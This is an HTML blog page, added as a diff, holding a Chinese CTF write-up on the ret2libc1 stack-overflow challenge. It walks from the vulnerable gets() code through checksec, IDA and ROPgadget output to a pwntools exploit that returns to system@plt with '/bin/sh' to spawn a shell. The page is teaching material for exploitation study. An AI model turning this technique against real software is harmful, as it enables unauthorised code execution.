@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="hollk">
+
+
+    <meta name="subtitle" content="ret2text">
+
+
+    <meta name="description" content="说人话，讲清楚，负责到底">
+
+
+    <meta name="keywords" content="ret2text,二进制,pwn,ctf-wiki">
+
+
+<title>好好说话之ret2libc1 | Hollk&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Hollk&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Hollk&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    <article class="post-wrap page">
+        
+        <h2 class="post-title">好好说话之ret2libc1</h2>
+        
+        <section class="post-content">
+            <p>题目路径：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/ctf-challenges/</span>pwn<span class="regexp">/stackoverflow/</span>ret2libc<span class="regexp">/ret2libc1</span></span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got  表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址</p>
+<p>看C代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> *shell = <span class="string">"/bin/sh"</span>;</span><br><span class="line"><span class="keyword">char</span> buf2[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> secretcode, input;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    secretcode = rand();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">    <span class="keyword">if</span>(input == secretcode)</span><br><span class="line">        system(<span class="string">"shell!?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"RET2LIBC &gt;_&lt;\n"</span>);</span><br><span class="line">    gets(buf1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>checksec检查一下程序的保护机制</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec ret2libc1</span></span><br><span class="line">[*] '/home/hollk/ctf-challenges/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>程序开启了NX保护，不能自己构造shellcode插入到栈中，也不能利用跳转，那么就需要使用系统自带的函数或者使用gadget进行溢出，IDA查看一下伪代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"RET2LIBC &gt;_&lt;"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>依然还是gets函数，存在溢出点。v4变量距离esp指针0x1c，距离ebp指针0x64，所以v4其实地址距离ret返回地址0x6c+4个字节</p>
+<p>在不显示源码的情况下，可以通过ROPgadget工具查看是否存在’/bin/sh’字符串</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hollk@ubuntu:~/ctf-challenges/pwn/stackoverflow/ret2libc/ret2libc1$ ROPgadget --binary ret2libc1 --string '/bin/sh'</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>发现程序中存在’/bin/sh’字符串并获得地址，如果只有’/bin/sh’是不够的，在不使用gadget的情况下需要查找远程序中是否由system函数，让system函数执行binshell，使用IDA查看程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048460 ; int system(const char *command)</span><br><span class="line">.plt:08048460 _system         proc near               ; CODE XREF: secure+44p</span><br><span class="line">.plt:08048460                 jmp     ds:off_804A018</span><br><span class="line">.plt:08048460 _system         endp</span><br></pre></td></tr></table></figure>
+
+<p>发现在.plt中存在system函数，但需要考虑的是调用plt中的函数时需要在栈中部署两个参数，首先第一个是system执行后的返回地址，第二个是system函数中的参数。下面写exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2libc1'</span>)</span><br><span class="line">bin_sh = <span class="number">0x08048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">'hollkdig'</span>*<span class="number">14</span>, system_plt, <span class="string">'holk'</span>, bin_sh])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>payload在栈中的部署：</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">                     +---------------------------+</span><br><span class="line">                     |          <span class="type">bin_sh</span>           | <span class="type">部署bin_sh</span>作为systemcall的参数</span><br><span class="line">                     +---------------------------+</span><br><span class="line">                     |           <span class="type">holk</span>            | <span class="type">部署holk</span>作为systemcall函数的返回地址 </span><br><span class="line">                     +---------------------------+</span><br><span class="line">                     |        <span class="type">system_plt</span>         | <span class="type">执行system_plt</span>，覆盖原ret返回位置</span><br><span class="line">                     +---------------------------+</span><br><span class="line">                     |           <span class="type">kdig</span>            | <span class="type">kdig</span>覆盖原saved ebp位置</span><br><span class="line">              ebp---&gt;+---------------------------+</span><br><span class="line">                     |           <span class="type">holl</span>            | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">                     |           <span class="type">....            |        ......</span></span><br><span class="line"><span class="type">                     |           kdig</span>            | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">                     |           <span class="type">holl</span>            | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">                     |           <span class="type">kdig</span>            | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">                     |           <span class="type">holl</span>            | <span class="type">hollkdig</span>占位填满栈空间</span><br><span class="line">v4终止位置,ebp<span class="number">-0x64</span>--&gt;+---------------------------+</span><br></pre></td></tr></table></figure>
+        </section>
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+	<br>
+	<span>© hollk | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+
+
+
+</footer>
+
+    </div>
+</body>
+</html>
